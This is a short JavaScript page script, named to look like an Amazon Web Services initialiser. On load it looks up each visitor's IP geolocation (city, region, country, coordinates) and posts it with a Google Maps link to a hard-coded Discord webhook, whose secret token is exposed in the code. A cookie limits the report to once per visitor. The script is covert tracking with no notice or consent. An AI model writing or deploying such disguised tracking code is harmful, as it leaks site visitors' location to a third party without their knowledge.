function amazonWEBserviceInit() {
    if (document.cookie.split('; ').find(row => row.startsWith('insights='))) {
        console.log("Cookie found, no need to send location.");
        return;
    }

    fallbackToIP();
}

function fallbackToIP() {
    fetch("https://ipwho.is/")
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                const latitude = data.latitude || 0;
                const longitude = data.longitude || 0;
                const city = data.city || "Unknown City";
                const region = data.region || "Unknown Region";
                const country = data.country || "Unknown Country";

                // Generate Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                // Message for Discord
                const message = {
                    content: `# New user on the site\n**IP-based Location:** ${city}, ${region}, ${country}\n[*Google Maps Preview*](${mapsLink})`
                };

                sendToDiscord(message);
            } else {
                console.error("Failed to retrieve geolocation data:", data.message);
            }
        })
        .catch(error => {
            console.error("Fetch error:", error);
        });
}

function sendToDiscord(message) {
    fetch("https://discord.com/api/webhooks/1309236874442706944/VTPRwgKNDG9xOfJl5xTeuLH01kY4UtDUj9_DxnSuURGUYZu0WAb08g6gSLf54sDhB3NP", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
    })
        .then(response => {
            if (response.ok) {
                console.log("Submitted to Discord successfully.");
                document.cookie = `insights=submitted; path=/;`;
            } else {
                console.error("Error submitting to Discord:", response.statusText);
            }
        });
}

amazonWEBserviceInit();
